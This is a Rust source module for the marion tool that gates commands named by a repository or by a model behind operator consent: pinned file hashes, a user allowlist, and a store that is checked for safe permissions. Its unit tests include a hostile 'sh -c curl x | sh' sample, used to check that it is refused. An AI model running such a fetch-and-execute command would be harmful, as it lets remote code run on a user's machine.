//! **Consent for the commands a repository names**, direnv-style.
//!
//! A tree's `.marion/agents.toml` is a tracked file of whatever repository the operator cloned, and
//! one of its keys names a program: `harness = "acp:<command>"` binds an ACP agent to that command
//! line ([`marion_harness::acp::Binding::resolve`]), which refuses only an empty one. Without this
//! module a cloned repository could make marion run any binary the moment its type was spawned.
//!
//! So a file that names such a command runs it only after the operator has read it and said so:
//! `marion trust allow` shows what the file would run and records the file's canonical path and
//! the SHA-256 of its bytes in `$XDG_DATA_HOME/marion/trusted.toml`. Trust is by **content**: any
//! edit to the file, by anyone (a node included), revokes it until it is allowed again.
//!
//! What never needs trust: a type whose harness is a built-in row, and an `acp:<id>` naming one of
//! marion's own refinement rows ([`marion_harness::acp::AGENTS`]) — marion supplies those argv, the
//! file only selects them. User-level configuration (`~/.config/marion/…`) is the operator's own
//! and names no repository command.
//!
//! A **model-named** command is gated separately ([`require_model_named`]): a `spawn` a node or
//! an MCP client sends may name a free-form `acp:<command>` only where the operator listed it in
//! the user-level [`ACP_ALLOW_FILE`].
//!
//! **Never a prompt.** A spawn arrives over MCP from a model, which cannot consent on the
//! operator's behalf; the refusal names the one command the operator runs instead.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use marion_core::agent_type::{AgentType, AgentTypes};

/// The trust store's file name, under `$XDG_DATA_HOME/marion/`.
pub const STORE_FILE: &str = "trusted.toml";

pub const USAGE: &str = "usage: marion trust allow [<file>] | deny [<file>] | list\n\
    \x20 <file> defaults to the nearest .marion/agents.toml at or above the current directory";

/// Why a repository command was not run, or the trust store could not be used.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum TrustError {
    #[error(
        "agent type {agent_type:?} runs `{command}`, a command named by {file}, which {why}. \
         marion runs a repository's own commands only after you have reviewed them; read the \
         file, then run: marion trust allow {quoted}",
        command = argv.join(" "),
        why = if *edited { "has changed since you allowed it" } else { "you have not allowed" },
        quoted = shell_word(&file.display().to_string()),
    )]
    Untrusted {
        file: PathBuf,
        agent_type: String,
        argv: Vec<String>,
        edited: bool,
    },
    #[error(
        "agent type {agent_type:?} runs `{command}`, a command a model named rather than you. \
         marion runs a model-named ACP command only when you have listed it; to allow it, add \
         this line to {file}: allow = [{quoted}]",
        command = argv.join(" "),
        quoted = toml_string(&argv.join(" ")),
        file = file.display(),
    )]
    ModelCommand {
        agent_type: String,
        argv: Vec<String>,
        file: PathBuf,
    },
    #[error(
        "the trust store {path} is refused: {why}. It decides which repository commands marion \
         runs, so only you may be able to write it; fix it with `chmod 600 {path}` (and \
         `chmod 700` on its directory)"
    )]
    UnsafeStore { path: PathBuf, why: String },
    #[error(
        "neither $XDG_DATA_HOME nor $HOME is set, so there is no trust store and no repository \
         command can be allowed"
    )]
    NoStore,
    #[error("{0}")]
    Io(String),
}

/// A command a repository file names: the agent type that runs it, and its argv.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepoCommand {
    pub agent_type: String,
    pub argv: Vec<String>,
}

/// The argv `ty` runs that the **file** supplied, or `None` where marion supplies it (a built-in
/// harness row, or an ACP refinement row selected by its id).
pub fn repo_command(ty: &AgentType) -> Option<Vec<String>> {
    let binding = marion_harness::acp::Binding::resolve(ty.acp_agent.as_deref()?).ok()?;
    binding
        .refinement()
        .is_none()
        .then(|| binding.argv().to_vec())
}

/// Every command a parsed `.marion/agents.toml` names, in file order.
pub fn commands(types: &AgentTypes) -> Vec<RepoCommand> {
    types
        .user()
        .iter()
        .filter_map(|t| {
            repo_command(t).map(|argv| RepoCommand {
                agent_type: t.name.clone(),
                argv,
            })
        })
        .collect()
}

/// **The gate.** `ty`, resolved from `file` whose bytes were `text`, may run only if it names no
/// repository command or the store trusts exactly these bytes at this path.
///
/// `text` is the text the caller parsed, so the digest is of what will run and not of a second
/// read that a writer could have changed in between.
pub fn require(file: &Path, text: &str, ty: &AgentType) -> Result<(), TrustError> {
    if repo_command(ty).is_none() {
        return Ok(());
    }
    require_in(store_path().ok_or(TrustError::NoStore)?, file, text, ty)
}

/// [`require`] against the store at `store`.
pub fn require_in(
    store: PathBuf,
    file: &Path,
    text: &str,
    ty: &AgentType,
) -> Result<(), TrustError> {
    let Some(argv) = repo_command(ty) else {
        return Ok(());
    };
    let store = Store::open(store)?;
    let file = canonical(file)?;
    match store.verdict(&file, &crate::inbox::sha256_hex(text.as_bytes())) {
        Verdict::Trusted => Ok(()),
        verdict => Err(TrustError::Untrusted {
            file,
            agent_type: ty.name.clone(),
            argv,
            edited: verdict == Verdict::Edited,
        }),
    }
}

/// The operator's list of the ACP commands a model may name, under the user-level config directory
/// (`$XDG_CONFIG_HOME/marion/`, never a repository's): `allow = ["<command> [args…]", …]`.
pub const ACP_ALLOW_FILE: &str = "acp.toml";

#[derive(serde::Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct AllowFile {
    #[serde(default)]
    allow: Vec<String>,
}

/// **The gate on a spawn a model asked for**: from a node, or from a `marion mcp` client. Such a
/// spawn may name `acp:<id>` for one of marion's refinement rows, a built-in, or a row of the
/// tree's file (which [`require`] gates), but a free-form `acp:<command>` runs only where the
/// operator has listed that exact command in [`ACP_ALLOW_FILE`]. A model cannot consent on the
/// operator's behalf, and without this any model could run any program through marion. The
/// operator's own `marion run acp:<command>` never comes here: the operator typed it.
pub fn require_model_named(name: &str) -> Result<(), TrustError> {
    let allow = crate::credentials::config_dir()
        .map(|d| d.join(ACP_ALLOW_FILE))
        .unwrap_or_else(|_| PathBuf::from("~/.config/marion").join(ACP_ALLOW_FILE));
    require_model_named_in(&allow, name)
}

/// [`require_model_named`] for `agent/spawn`: a spawn with a `caller` is a node's, so its model
/// chose the type. A spawn without one is a client's root, gated where the client is a model
/// (`mcp::tool_spawn`) and not where it is the operator (`marion run`).
pub fn check_child_spawn(
    p: &marion_core::proto::params::AgentSpawnParams,
) -> Result<(), marion_core::proto::RpcError> {
    if p.caller.is_none() {
        return Ok(());
    }
    require_model_named(&p.agent_type).map_err(|e| {
        marion_core::proto::RpcError::refused("agent_type", e.to_string(), "repo trust")
    })
}

/// [`require_model_named`] against the allowlist at `allow`.
pub fn require_model_named_in(allow: &Path, name: &str) -> Result<(), TrustError> {
    let Some(argv) = marion_core::agent_type::builtin(name)
        .as_ref()
        .and_then(repo_command)
    else {
        return Ok(());
    };
    let listed = match std::fs::read_to_string(allow) {
        Ok(text) => {
            check_private(allow)?;
            toml::from_str::<AllowFile>(&text)
                .map_err(|e| TrustError::Io(format!("{}: {e}", allow.display())))?
                .allow
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
        Err(e) => return Err(TrustError::Io(format!("{}: {e}", allow.display()))),
    };
    if listed.iter().any(|c| c.split_whitespace().eq(argv.iter())) {
        return Ok(());
    }
    Err(TrustError::ModelCommand {
        agent_type: name.to_string(),
        argv,
        file: allow.to_path_buf(),
    })
}

/// `s` as a TOML basic string.
fn toml_string(s: &str) -> String {
    toml_edit::Value::from(s).to_string().trim().to_string()
}

/// `$XDG_DATA_HOME/marion/trusted.toml`, else `~/.local/share/marion/trusted.toml`.
pub fn store_path() -> Option<PathBuf> {
    store_path_from(|k| std::env::var(k).ok())
}

/// [`store_path`] over `var`; an empty value counts as unset, as it does for profiles.
pub fn store_path_from(var: impl Fn(&str) -> Option<String>) -> Option<PathBuf> {
    let set = |k: &str| var(k).filter(|v| !v.is_empty()).map(PathBuf::from);
    let data = set("XDG_DATA_HOME").or_else(|| set("HOME").map(|h| h.join(".local/share")))?;
    Some(data.join("marion").join(STORE_FILE))
}

/// What the store says about one file's current bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Trusted,
    /// Allowed once, with other bytes: the file has been edited since.
    Edited,
    Unknown,
}

#[derive(serde::Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct StoreFile {
    #[serde(default, rename = "file")]
    files: Vec<Entry>,
}

#[derive(serde::Deserialize, Clone, Debug, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
struct Entry {
    path: PathBuf,
    sha256: String,
}

/// The trust store, read and permission-checked.
pub struct Store {
    path: PathBuf,
    files: Vec<Entry>,
}

impl Store {
    /// The store at `path`: empty where it does not exist, refused where anyone but the operator
    /// could have written it.
    pub fn open(path: PathBuf) -> Result<Self, TrustError> {
        let text = match std::fs::read_to_string(&path) {
            Ok(text) => text,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return Ok(Self {
                    path,
                    files: Vec::new(),
                });
            }
            Err(e) => return Err(TrustError::Io(format!("{}: {e}", path.display()))),
        };
        check_private(&path)?;
        let file: StoreFile = toml::from_str(&text)
            .map_err(|e| TrustError::Io(format!("{}: {e}", path.display())))?;
        Ok(Self {
            path,
            files: file.files,
        })
    }

    /// Whether `file` (canonical) is trusted with the digest `sha256`.
    pub fn verdict(&self, file: &Path, sha256: &str) -> Verdict {
        match self.files.iter().find(|e| e.path == file) {
            Some(e) if e.sha256 == sha256 => Verdict::Trusted,
            Some(_) => Verdict::Edited,
            None => Verdict::Unknown,
        }
    }

    /// Trust `file` (canonical) with exactly `sha256`, replacing any earlier digest for it.
    fn allow(&mut self, file: PathBuf, sha256: String) {
        self.files.retain(|e| e.path != file);
        self.files.push(Entry { path: file, sha256 });
    }

    /// Forget `file`; whether it was trusted.
    fn deny(&mut self, file: &Path) -> bool {
        let before = self.files.len();
        self.files.retain(|e| e.path != file);
        self.files.len() != before
    }

    fn save(&self) -> Result<(), TrustError> {
        // `toml` is built without its serializer here; `toml_edit` quotes each value.
        let quote = toml_string;
        let body: String = self
            .files
            .iter()
            .map(|e| {
                format!(
                    "[[file]]\npath = {}\nsha256 = {}\n\n",
                    quote(&e.path.to_string_lossy()),
                    quote(&e.sha256)
                )
            })
            .collect();
        crate::private_fs::write_atomic(&self.path, body.as_bytes())
            .map_err(|e| TrustError::Io(format!("{}: {e}", self.path.display())))
    }
}

/// Refuse a store, or its directory, that is not the operator's alone: owned by someone else, a
/// symlink, or writable by group or world.
fn check_private(path: &Path) -> Result<(), TrustError> {
    use std::os::unix::fs::MetadataExt;
    let refuse = |why: String| TrustError::UnsafeStore {
        path: path.to_path_buf(),
        why,
    };
    let me = rustix::process::geteuid().as_raw();
    let file = std::fs::symlink_metadata(path)
        .map_err(|e| TrustError::Io(format!("{}: {e}", path.display())))?;
    if !file.file_type().is_file() {
        return Err(refuse("it is not a regular file".into()));
    }
    let dir = path.parent().unwrap_or(Path::new("/"));
    let dir_meta =
        std::fs::metadata(dir).map_err(|e| TrustError::Io(format!("{}: {e}", dir.display())))?;
    for (what, meta) in [("it", &file), ("its directory", &dir_meta)] {
        if meta.uid() != me {
            return Err(refuse(format!("{what} is owned by uid {}", meta.uid())));
        }
        if meta.mode() & 0o022 != 0 {
            return Err(refuse(format!(
                "{what} is writable by group or others (mode {:o})",
                meta.mode() & 0o777
            )));
        }
    }
    Ok(())
}

/// `file`'s canonical path; for a file that no longer exists, its directory's canonical path and
/// its name, so `deny` can still forget a deleted file.
fn canonical(file: &Path) -> Result<PathBuf, TrustError> {
    let io = |e: std::io::Error| TrustError::Io(format!("{}: {e}", file.display()));
    match std::fs::canonicalize(file) {
        Ok(p) => Ok(p),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            let name = file.file_name().ok_or_else(|| io(e))?;
            let dir = match file.parent() {
                Some(d) if !d.as_os_str().is_empty() => d,
                _ => Path::new("."),
            };
            Ok(std::fs::canonicalize(dir).map_err(io)?.join(name))
        }
        Err(e) => Err(io(e)),
    }
}

/// `s` as one shell word: bare where it is plainly safe, single-quoted otherwise.
fn shell_word(s: &str) -> String {
    if !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"/._-+:@".contains(&b))
    {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', r"'\''"))
    }
}

/// `marion trust allow [<file>] | deny [<file>] | list`.
pub fn cli_main(args: &[String]) -> ExitCode {
    let cwd = match std::env::current_dir() {
        Ok(d) => d,
        Err(e) => {
            eprintln!("marion trust: current directory: {e}");
            return ExitCode::FAILURE;
        }
    };
    let Some(store) = store_path() else {
        eprintln!("marion trust: {}", TrustError::NoStore);
        return ExitCode::FAILURE;
    };
    match run(args, &cwd, store, &mut std::io::stdout()) {
        Ok(()) => ExitCode::SUCCESS,
        Err(None) => {
            eprintln!("{USAGE}");
            ExitCode::from(2)
        }
        Err(Some(e)) => {
            eprintln!("marion trust: {e}");
            ExitCode::FAILURE
        }
    }
}

/// The verbs over an explicit cwd and store path, writing to `out`. `Err(None)` is a usage error.
pub fn run(
    args: &[String],
    cwd: &Path,
    store: PathBuf,
    out: &mut dyn std::io::Write,
) -> Result<(), Option<String>> {
    let file_arg = |rest: &[String]| -> Result<PathBuf, Option<String>> {
        match rest {
            [] => nearest_agents_file(cwd).ok_or_else(|| {
                Some(format!(
                    "no {} at or above {}; name the file",
                    crate::run::AGENT_TYPES_FILE,
                    cwd.display()
                ))
            }),
            [f] => Ok(cwd.join(f)),
            _ => Err(None),
        }
    };
    let err = |e: TrustError| Some(e.to_string());
    let w = |r: std::io::Result<()>| r.map_err(|e| Some(e.to_string()));
    match args {
        [verb, rest @ ..] if verb == "allow" => {
            let file = file_arg(rest)?;
            let canonical = canonical(&file).map_err(err)?;
            let text = std::fs::read_to_string(&canonical)
                .map_err(|e| Some(format!("{}: {e}", canonical.display())))?;
            let types = crate::run::agent_types_text(canonical.clone(), &text)
                .map_err(|e| Some(e.to_string()))?;
            let found = commands(&types);
            if found.is_empty() {
                return w(writeln!(
                    out,
                    "{} names no repository command; its types need no trust",
                    canonical.display()
                ));
            }
            let sha256 = crate::inbox::sha256_hex(text.as_bytes());
            w(describe(out, &canonical, &sha256, &found))?;
            let mut store = Store::open(store).map_err(err)?;
            store.allow(canonical.clone(), sha256);
            store.save().map_err(err)?;
            w(writeln!(
                out,
                "allowed. Any edit to {} revokes this until you allow it again.",
                canonical.display()
            ))
        }
        [verb, rest @ ..] if verb == "deny" => {
            let file = canonical(&file_arg(rest)?).map_err(err)?;
            let mut store = Store::open(store).map_err(err)?;
            if store.deny(&file) {
                store.save().map_err(err)?;
                w(writeln!(out, "denied {}", file.display()))
            } else {
                w(writeln!(out, "{} was not trusted", file.display()))
            }
        }
        [verb] if verb == "list" => {
            let store = Store::open(store).map_err(err)?;
            if store.files.is_empty() {
                return w(writeln!(out, "no trusted files"));
            }
            for e in &store.files {
                let state = match std::fs::read(&e.path) {
                    Ok(bytes) if crate::inbox::sha256_hex(&bytes) == e.sha256 => "trusted",
                    Ok(_) => "edited ",
                    Err(_) => "missing",
                };
                w(writeln!(
                    out,
                    "{state}  {}  {}",
                    &e.sha256[..12.min(e.sha256.len())],
                    e.path.display()
                ))?;
            }
            Ok(())
        }
        _ => Err(None),
    }
}

/// What `allow` is about to trust, for the operator to read.
fn describe(
    out: &mut dyn std::io::Write,
    file: &Path,
    sha256: &str,
    found: &[RepoCommand],
) -> std::io::Result<()> {
    writeln!(out, "{}  sha256 {sha256}", file.display())?;
    let repo = file.parent().and_then(Path::parent);
    for c in found {
        writeln!(out, "  agent type {}", c.agent_type)?;
        writeln!(out, "    program: {}", c.argv[0])?;
        writeln!(out, "    argv:    {}", c.argv.join(" "))?;
        writeln!(out, "    env:     (none set by the file)")?;
        // Trust pins this file's bytes, not the files its command then reads.
        for a in &c.argv {
            if let Some(repo) = repo
                && let Ok(p) = std::fs::canonicalize(repo.join(a))
                && p.starts_with(repo)
            {
                writeln!(
                    out,
                    "    note:    {a} is inside the repository; trust does not pin its contents"
                )?;
            }
        }
    }
    Ok(())
}

/// The nearest `.marion/agents.toml` at or above `cwd`.
fn nearest_agents_file(cwd: &Path) -> Option<PathBuf> {
    cwd.ancestors()
        .map(|d| d.join(crate::run::AGENT_TYPES_FILE))
        .find(|f| f.is_file())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("marion-trust-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d.canonicalize().unwrap()
    }

    fn mode(p: &Path) -> u32 {
        std::fs::metadata(p).unwrap().permissions().mode() & 0o777
    }

    const CUSTOM: &str =
        "[[agent]]\nname = \"mine\"\nharness = \"acp:/bin/echo hi\"\ndescription = \"d\"\n";

    /// A repository with `text` as its agents file, and the store path beside it.
    fn repo(tag: &str, text: &str) -> (PathBuf, PathBuf, PathBuf) {
        let d = tmp(tag);
        let file = d.join("repo").join(crate::run::AGENT_TYPES_FILE);
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(&file, text).unwrap();
        (d.join("repo"), file, d.join("data/marion").join(STORE_FILE))
    }

    fn user_type(text: &str, name: &str) -> AgentType {
        AgentTypes::parse(text).unwrap().resolve(name).unwrap()
    }

    fn allow(cwd: &Path, store: &Path) -> String {
        let mut out = Vec::new();
        run(&["allow".into()], cwd, store.to_path_buf(), &mut out).unwrap();
        String::from_utf8(out).unwrap()
    }

    #[test]
    fn only_a_command_the_file_supplies_is_a_repo_command() {
        let custom = user_type(CUSTOM, "mine");
        assert_eq!(
            repo_command(&custom),
            Some(vec!["/bin/echo".into(), "hi".into()])
        );
        let refined = user_type(
            "[[agent]]\nname = \"c\"\nharness = \"acp:copilot\"\ndescription = \"d\"\n",
            "c",
        );
        assert_eq!(
            repo_command(&refined),
            None,
            "a refinement row's argv is marion's"
        );
        let builtin = user_type(
            "[[agent]]\nname = \"r\"\nharness = \"codex\"\ndescription = \"d\"\n",
            "r",
        );
        assert_eq!(
            repo_command(&builtin),
            None,
            "a built-in harness names no command"
        );
        for name in marion_core::agent_type::builtin_names() {
            let t = marion_core::agent_type::builtin(name).unwrap();
            assert_eq!(repo_command(&t), None, "{name} is built in");
        }
    }

    /// **A model-named `acp:<command>` runs only what the operator listed.** Refinement rows and
    /// built-ins pass untouched; any other command is refused with the one line to add, and passes
    /// once exactly that line is in the operator's own allowlist.
    #[test]
    fn a_model_named_acp_command_runs_only_when_the_operator_listed_it() {
        let d = tmp("model-named");
        let allow = d.join("config/marion").join(ACP_ALLOW_FILE);
        for passes in ["claude", "codex", "acp:copilot", "acp:opencode", "mine"] {
            require_model_named_in(&allow, passes).unwrap_or_else(|e| panic!("{passes}: {e}"));
        }
        let evil = "acp:sh -c 'curl x | sh'";
        let e = require_model_named_in(&allow, evil).unwrap_err();
        let msg = e.to_string();
        assert!(matches!(e, TrustError::ModelCommand { .. }), "{e:?}");
        assert!(msg.contains(&allow.display().to_string()), "{msg}");
        assert!(msg.contains(r#"allow = ["sh -c 'curl x | sh'"]"#), "{msg}");

        std::fs::create_dir_all(allow.parent().unwrap()).unwrap();
        std::fs::set_permissions(
            allow.parent().unwrap(),
            std::fs::Permissions::from_mode(0o700),
        )
        .unwrap();
        std::fs::write(&allow, "allow = [\"python3  /x/agent.py\"]\n").unwrap();
        std::fs::set_permissions(&allow, std::fs::Permissions::from_mode(0o600)).unwrap();
        require_model_named_in(&allow, "acp:python3 /x/agent.py").unwrap();
        assert!(
            require_model_named_in(&allow, "acp:python3 /x/agent.py --evil").is_err(),
            "the whole command line is what is listed, not its program"
        );
        assert!(require_model_named_in(&allow, evil).is_err());

        std::fs::set_permissions(&allow, std::fs::Permissions::from_mode(0o666)).unwrap();
        assert!(
            matches!(
                require_model_named_in(&allow, "acp:python3 /x/agent.py"),
                Err(TrustError::UnsafeStore { .. })
            ),
            "an allowlist anyone can write allows nothing"
        );
    }

    #[test]
    fn an_unknown_file_is_refused_with_the_exact_allow_command() {
        let (_, file, store) = repo("unknown", CUSTOM);
        let e = require_in(store, &file, CUSTOM, &user_type(CUSTOM, "mine")).unwrap_err();
        let msg = e.to_string();
        assert!(
            matches!(e, TrustError::Untrusted { edited: false, .. }),
            "{e:?}"
        );
        assert!(msg.contains("/bin/echo hi"), "{msg}");
        assert!(
            msg.ends_with(&format!("marion trust allow {}", file.display())),
            "{msg}"
        );
    }

    #[test]
    fn allow_records_the_bytes_and_an_edit_revokes_them() {
        let (repo, file, store) = repo("allow", CUSTOM);
        let ty = user_type(CUSTOM, "mine");
        let shown = allow(&repo, &store);
        assert!(shown.contains("program: /bin/echo"), "{shown}");
        assert!(shown.contains("agent type mine"), "{shown}");
        assert_eq!(mode(&store), 0o600);
        assert_eq!(mode(store.parent().unwrap()), 0o700);
        require_in(store.clone(), &file, CUSTOM, &ty).unwrap();

        let edited = CUSTOM.replace("hi", "bye");
        std::fs::write(&file, &edited).unwrap();
        let e = require_in(store.clone(), &file, &edited, &user_type(&edited, "mine")).unwrap_err();
        assert!(
            matches!(e, TrustError::Untrusted { edited: true, .. }),
            "{e:?}"
        );
        assert!(
            e.to_string().contains("changed since you allowed it"),
            "{e}"
        );
    }

    #[test]
    fn deny_forgets_a_file_and_list_reports_each_state() {
        let (repo, file, store) = repo("deny", CUSTOM);
        allow(&repo, &store);
        let list = |store: &Path| {
            let mut out = Vec::new();
            run(&["list".into()], &repo, store.to_path_buf(), &mut out).unwrap();
            String::from_utf8(out).unwrap()
        };
        assert!(list(&store).starts_with("trusted "), "{}", list(&store));
        std::fs::write(&file, "# edited\n").unwrap();
        assert!(list(&store).starts_with("edited "), "{}", list(&store));
        let mut out = Vec::new();
        run(&["deny".into()], &repo, store.clone(), &mut out).unwrap();
        assert!(String::from_utf8(out).unwrap().starts_with("denied "));
        assert_eq!(list(&store), "no trusted files\n");
        let e = require_in(store, &file, CUSTOM, &user_type(CUSTOM, "mine")).unwrap_err();
        assert!(
            matches!(e, TrustError::Untrusted { edited: false, .. }),
            "{e:?}"
        );
    }

    #[test]
    fn a_group_or_world_writable_store_is_refused_and_trusts_nothing() {
        let (repo, file, store) = repo("perm", CUSTOM);
        allow(&repo, &store);
        let ty = user_type(CUSTOM, "mine");
        for bad in [0o666, 0o620] {
            std::fs::set_permissions(&store, std::fs::Permissions::from_mode(bad)).unwrap();
            let e = require_in(store.clone(), &file, CUSTOM, &ty).unwrap_err();
            assert!(
                matches!(e, TrustError::UnsafeStore { .. }),
                "{bad:o}: {e:?}"
            );
        }
        std::fs::set_permissions(&store, std::fs::Permissions::from_mode(0o600)).unwrap();
        std::fs::set_permissions(
            store.parent().unwrap(),
            std::fs::Permissions::from_mode(0o777),
        )
        .unwrap();
        let e = require_in(store.clone(), &file, CUSTOM, &ty).unwrap_err();
        assert!(e.to_string().contains("its directory"), "{e}");
        std::fs::set_permissions(
            store.parent().unwrap(),
            std::fs::Permissions::from_mode(0o700),
        )
        .unwrap();
        require_in(store, &file, CUSTOM, &ty).unwrap();
    }

    #[test]
    fn a_symlinked_store_is_refused() {
        let (repo, file, store) = repo("link", CUSTOM);
        allow(&repo, &store);
        let real = store.with_extension("real");
        std::fs::rename(&store, &real).unwrap();
        std::os::unix::fs::symlink(&real, &store).unwrap();
        let e = require_in(store, &file, CUSTOM, &user_type(CUSTOM, "mine")).unwrap_err();
        assert!(matches!(e, TrustError::UnsafeStore { .. }), "{e:?}");
    }

    #[test]
    fn a_file_with_no_command_is_not_recorded() {
        let text = "[[agent]]\nname = \"r\"\nharness = \"codex\"\ndescription = \"d\"\n";
        let (repo, _, store) = repo("none", text);
        assert!(allow(&repo, &store).contains("need no trust"));
        assert!(!store.exists(), "nothing to trust, nothing written");
    }

    #[test]
    fn allow_refuses_a_file_the_loader_would_refuse() {
        let (repo, _, store) = repo("bad", "[[agent]]\nname = \"x\"\n");
        let mut out = Vec::new();
        assert!(matches!(
            run(&["allow".into()], &repo, store.clone(), &mut out),
            Err(Some(_))
        ));
        assert!(!store.exists());
    }

    #[test]
    fn the_store_lives_under_xdg_data_home_else_home() {
        let vars = |pairs: &'static [(&'static str, &'static str)]| {
            move |k: &str| {
                pairs
                    .iter()
                    .find(|(n, _)| *n == k)
                    .map(|(_, v)| v.to_string())
            }
        };
        assert_eq!(
            store_path_from(vars(&[("XDG_DATA_HOME", "/d"), ("HOME", "/h")])),
            Some(PathBuf::from("/d/marion/trusted.toml"))
        );
        assert_eq!(
            store_path_from(vars(&[("XDG_DATA_HOME", ""), ("HOME", "/h")])),
            Some(PathBuf::from("/h/.local/share/marion/trusted.toml"))
        );
        assert_eq!(store_path_from(vars(&[])), None);
    }

    #[test]
    fn a_path_with_spaces_is_quoted_in_the_allow_command() {
        assert_eq!(shell_word("/a/b.toml"), "/a/b.toml");
        assert_eq!(shell_word("/a b/it's"), r"'/a b/it'\''s'");
    }
}
